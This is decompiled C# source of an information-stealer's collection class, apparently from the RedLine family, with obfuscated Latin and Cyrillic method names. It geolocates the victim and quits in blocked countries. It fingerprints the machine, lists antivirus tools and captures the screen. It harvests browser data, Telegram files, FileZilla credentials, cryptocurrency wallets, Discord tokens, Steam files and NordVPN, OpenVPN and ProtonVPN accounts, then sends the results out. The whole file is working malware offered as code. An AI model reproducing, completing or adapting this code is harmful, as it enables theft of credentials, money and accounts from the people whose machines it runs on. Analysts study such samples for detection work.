using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.CSharp.RuntimeBinder;

// Token: 0x02000013 RID: 19
public class FullInfoSender : IdentitySenderBase
{
	// Token: 0x06000079 RID: 121 RVA: 0x00006F28 File Offset: 0x00005128
	public FullInfoSender()
	{
		IdentitySenderBase.Actions = new ParsSt[]
		{
			new ParsSt(FullInfoSender.asdk9345asd),
			new ParsSt(FullInfoSender.asdk8jasd),
			new ParsSt(FullInfoSender.ылв92р34выа),
			new ParsSt(FullInfoSender.аловй),
			new ParsSt(FullInfoSender.ыал8р45),
			new ParsSt(FullInfoSender.ываш9р34),
			new ParsSt(FullInfoSender.ывал8н34),
			new ParsSt(FullInfoSender.вал93тфыв),
			new ParsSt(FullInfoSender.вашу0л34),
			new ParsSt(FullInfoSender.навева),
			new ParsSt(FullInfoSender.ащы9р34),
			new ParsSt(FullInfoSender.ыва83о4тфыв),
			new ParsSt(FullInfoSender.askd435),
			new ParsSt(FullInfoSender.sdi845sa),
			new ParsSt(FullInfoSender.длвап9345)
		};
		IdentitySenderBase.PreStageActions = new ParsSt[]
		{
			new ParsSt(FullInfoSender.sdf934asd),
			new ParsSt(FullInfoSender.asd44123),
			new ParsSt(FullInfoSender.sdfi35sdf),
			new ParsSt(FullInfoSender.sdfo8n234),
			new ParsSt(FullInfoSender.asdkadu8),
			new ParsSt(FullInfoSender.fdfg9i3jn4)
		};
		Random rnd = new Random();
		IdentitySenderBase.Actions = (from x in IdentitySenderBase.Actions
		orderby rnd.Next()
		select x).ToArray<ParsSt>();
		IdentitySenderBase.PreStageActions = (from x in IdentitySenderBase.PreStageActions
		orderby rnd.Next()
		select x).ToArray<ParsSt>();
	}

	// Token: 0x0600007A RID: 122 RVA: 0x00003622 File Offset: 0x00001822
	public override bool Send(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		return FullInfoSender.sdf9j3nasd(connection, settings, ref result);
	}

	// Token: 0x0600007B RID: 123 RVA: 0x000070E4 File Offset: 0x000052E4
	public static bool sdf9j3nasd(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		bool result2;
		try
		{
			result.ScanDetails = new ScanDetails
			{
				AvailableLanguages = new List<string>(),
				Browsers = new List<Browser>(),
				FtpConnections = new List<Account>(),
				GameChatFiles = new List<ScannedFile>(),
				GameLauncherFiles = new List<ScannedFile>(),
				InstalledBrowsers = new List<BrowserVersion>(),
				MessageClientFiles = new List<ScannedFile>(),
				NordAccounts = new List<Account>(),
				Open = new List<ScannedFile>(),
				Processes = new List<string>(),
				Proton = new List<ScannedFile>(),
				ScannedFiles = new List<ScannedFile>(),
				ScannedWallets = new List<ScannedFile>(),
				SecurityUtils = new List<string>(),
				Softwares = new List<string>(),
				SystemHardwares = new List<SystemHardware>()
			};
			FullInfoSender.dsf9jb(settings, ref result);
			result.SeenBefore = Program.SeenBefore();
			result.ReplaceEmptyValues();
			foreach (ParsSt parsSt in IdentitySenderBase.PreStageActions)
			{
				try
				{
					parsSt(connection, settings, ref result);
				}
				catch (InvalidOperationException ex)
				{
					throw ex;
				}
				catch (Exception)
				{
				}
			}
			FullInfoSender.LSIDsd2(connection, settings, ref result);
			connection.TryVerify(result);
			result2 = true;
		}
		catch (InvalidOperationException ex2)
		{
			throw ex2;
		}
		catch (Exception)
		{
			result2 = false;
		}
		return result2;
	}

	// Token: 0x0600007C RID: 124 RVA: 0x00006A50 File Offset: 0x00004C50
	public static void dsf9jb(ScanningArgs settings, ref ScanResult result)
	{
		GeoInfo geoInfo = LocatorAPI.Gather();
		geoInfo.IP = (string.IsNullOrWhiteSpace(geoInfo.IP) ? "UNKNOWN" : geoInfo.IP);
		geoInfo.Location = (string.IsNullOrWhiteSpace(geoInfo.Location) ? "UNKNOWN" : geoInfo.Location);
		geoInfo.Country = (string.IsNullOrWhiteSpace(geoInfo.Country) ? "UNKNOWN" : geoInfo.Country);
		geoInfo.PostalCode = (string.IsNullOrWhiteSpace(geoInfo.PostalCode) ? "UNKNOWN" : geoInfo.PostalCode);
		List<string> blockedCountry = settings.BlockedCountry;
		if (blockedCountry != null && blockedCountry.Count > 0 && settings.BlockedCountry.Contains(geoInfo.Country))
		{
			Environment.Exit(0);
		}
		List<string> blockedIP = settings.BlockedIP;
		if (blockedIP != null && blockedIP.Count > 0 && settings.BlockedIP.Contains(geoInfo.IP))
		{
			Environment.Exit(0);
		}
		result.IPv4 = geoInfo.IP;
		result.City = geoInfo.Location;
		result.Country = geoInfo.Country;
		result.ZipCode = geoInfo.PostalCode;
	}

	// Token: 0x0600007D RID: 125 RVA: 0x00006B74 File Offset: 0x00004D74
	public static bool LSIDsd2(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		bool result2;
		try
		{
			foreach (ParsSt parsSt in IdentitySenderBase.Actions)
			{
				try
				{
					parsSt(connection, settings, ref result);
				}
				catch (InvalidOperationException ex)
				{
					throw ex;
				}
				catch (Exception)
				{
				}
			}
			result2 = true;
		}
		catch (InvalidOperationException ex2)
		{
			throw ex2;
		}
		catch (Exception)
		{
			result2 = false;
		}
		return result2;
	}

	// Token: 0x0600007E RID: 126 RVA: 0x000033EA File Offset: 0x000015EA
	public static void asdkadu8(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.Hardware = CryptoHelper.GetMd5Hash(Environment.UserDomainName + Environment.UserName + SystemInfoHelper.GetSerialNumber()).Replace("-", string.Empty);
	}

	// Token: 0x0600007F RID: 127 RVA: 0x0000341A File Offset: 0x0000161A
	public static void sdfo8n234(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.FileLocation = Assembly.GetExecutingAssembly().Location;
	}

	// Token: 0x06000080 RID: 128 RVA: 0x0000342C File Offset: 0x0000162C
	public static void sdfi35sdf(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.Language = InputLanguage.CurrentInputLanguage.Culture.EnglishName;
		result.OSVersion = SystemInfoHelper.GetWindowsVersion();
	}

	// Token: 0x06000081 RID: 129 RVA: 0x00007278 File Offset: 0x00005478
	public static void asd44123(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (FullInfoSender.<>o__8.<>p__1 == null)
		{
			FullInfoSender.<>o__8.<>p__1 = CallSite<Func<CallSite, object, string>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(FullInfoSender)));
		}
		Func<CallSite, object, string> target = FullInfoSender.<>o__8.<>p__1.Target;
		CallSite <>p__ = FullInfoSender.<>o__8.<>p__1;
		if (FullInfoSender.<>o__8.<>p__0 == null)
		{
			FullInfoSender.<>o__8.<>p__0 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.InvokeMember(CSharpBinderFlags.None, "ToString", null, typeof(FullInfoSender), new CSharpArgumentInfo[]
			{
				CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
			}));
		}
		result.Resolution = target(<>p__, FullInfoSender.<>o__8.<>p__0.Target(FullInfoSender.<>o__8.<>p__0, Resolution.MonitorSize()));
	}

	// Token: 0x06000082 RID: 130 RVA: 0x0000344E File Offset: 0x0000164E
	public static void fdfg9i3jn4(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.TZ = TimeZoneInfo.Local.DisplayName;
	}

	// Token: 0x06000083 RID: 131 RVA: 0x00003460 File Offset: 0x00001660
	public static void sdf934asd(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.MachineName = Environment.UserName;
	}

	// Token: 0x06000084 RID: 132 RVA: 0x0000731C File Offset: 0x0000551C
	public static void asdk9345asd(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		List<SystemHardware> list = new List<SystemHardware>();
		foreach (SystemHardware item in SystemInfoHelper.GetProcessors())
		{
			list.Add(item);
		}
		foreach (SystemHardware item2 in SystemInfoHelper.GetGraphicCards())
		{
			list.Add(item2);
		}
		list.Add(new SystemHardware
		{
			Name = "Total of RAM",
			HardType = HardwareType.Graphic,
			Counter = SystemInfoHelper.TotalOfRAM()
		});
		result.ScanDetails.SystemHardwares = list;
	}

	// Token: 0x06000085 RID: 133 RVA: 0x0000362C File Offset: 0x0000182C
	public static void asdk8jasd(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.ScanDetails.InstalledBrowsers = SystemInfoHelper.GetBrowsers();
	}

	// Token: 0x06000086 RID: 134 RVA: 0x0000363E File Offset: 0x0000183E
	public static void ылв92р34выа(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.ScanDetails.Softwares = SystemInfoHelper.ListOfPrograms();
	}

	// Token: 0x06000087 RID: 135 RVA: 0x00003650 File Offset: 0x00001850
	public static void аловй(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		ScanDetails scanDetails = result.ScanDetails;
		List<string> vs = SystemInfoHelper.GetVs();
		scanDetails.SecurityUtils = ((vs != null) ? vs.ToList<string>() : null);
	}

	// Token: 0x06000088 RID: 136 RVA: 0x0000366E File Offset: 0x0000186E
	public static void ыал8р45(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.ScanDetails.Processes = SystemInfoHelper.ListOfProcesses();
	}

	// Token: 0x06000089 RID: 137 RVA: 0x00003680 File Offset: 0x00001880
	public static void ываш9р34(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		result.ScanDetails.AvailableLanguages = SystemInfoHelper.AvailableLanguages();
	}

	// Token: 0x0600008A RID: 138 RVA: 0x00003692 File Offset: 0x00001892
	public static void длвап9345(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanScreen)
		{
			result.Monitor = Resolution.Print();
		}
	}

	// Token: 0x0600008B RID: 139 RVA: 0x000073F8 File Offset: 0x000055F8
	public static void ывал8н34(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanTelegram)
		{
			List<ScannedFile> messageClientFiles = FileScanning.Search(new FileScanner[]
			{
				new DesktopMessanger()
			});
			result.ScanDetails.MessageClientFiles = messageClientFiles;
		}
	}

	// Token: 0x0600008C RID: 140 RVA: 0x00007430 File Offset: 0x00005630
	public static void вал93тфыв(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanBrowsers)
		{
			List<Browser> list = new List<Browser>();
			list.AddRange(Chr_0_M_e.Scan(settings.ScanChromeBrowsersPaths));
			list.AddRange(g_E_c_к_0.TryFind(settings.ScanGeckoBrowsersPaths));
			result.ScanDetails.Browsers = list;
		}
	}

	// Token: 0x0600008D RID: 141 RVA: 0x000036A7 File Offset: 0x000018A7
	public static void вашу0л34(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanFiles)
		{
			result.ScanDetails.ScannedFiles = FileSearcher.Search(settings.ScanFilesPaths);
		}
	}

	// Token: 0x0600008E RID: 142 RVA: 0x000036C7 File Offset: 0x000018C7
	public static void навева(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanFTP)
		{
			result.ScanDetails.FtpConnections = FileZilla.Scan();
		}
	}

	// Token: 0x0600008F RID: 143 RVA: 0x0000747C File Offset: 0x0000567C
	public static void ащы9р34(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanWallets)
		{
			BrEx brEx = new BrEx();
			brEx.Init(settings.ScanChromeBrowsersPaths);
			List<ScannedFile> scannedWallets = FileScanning.Search(new FileScanner[]
			{
				new Armory(),
				new Atomic(),
				new C_o1_n0_mи(),
				new EL3_K_Tr00M(),
				new Eth(),
				new E_x0_d_u_S(),
				new Guarda(),
				new Jx(),
				new mYDict(),
				new AllWallets(),
				new Binance(),
				brEx
			});
			result.ScanDetails.ScannedWallets = scannedWallets;
		}
	}

	// Token: 0x06000090 RID: 144 RVA: 0x000036E1 File Offset: 0x000018E1
	public static void ыва83о4тфыв(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanDiscord)
		{
			ScanDetails scanDetails = result.ScanDetails;
			IEnumerable<ScannedFile> tokens = Discord.GetTokens();
			scanDetails.GameChatFiles = ((tokens != null) ? tokens.ToList<ScannedFile>() : null);
		}
	}

	// Token: 0x06000091 RID: 145 RVA: 0x00003707 File Offset: 0x00001907
	public static void askd435(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanSteam)
		{
			result.ScanDetails.GameLauncherFiles = FileScanning.Search(new FileScanner[]
			{
				new GameLauncher()
			});
		}
	}

	// Token: 0x06000092 RID: 146 RVA: 0x00007520 File Offset: 0x00005720
	public static void sdi845sa(EndpointConnection connection, ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanVPN)
		{
			result.ScanDetails.NordAccounts = NordApp.Find();
			result.ScanDetails.Open = FileScanning.Search(new FileScanner[]
			{
				new OpenVPN()
			});
			result.ScanDetails.Proton = FileScanning.Search(new FileScanner[]
			{
				new ProtonVPN()
			});
		}
	}
}
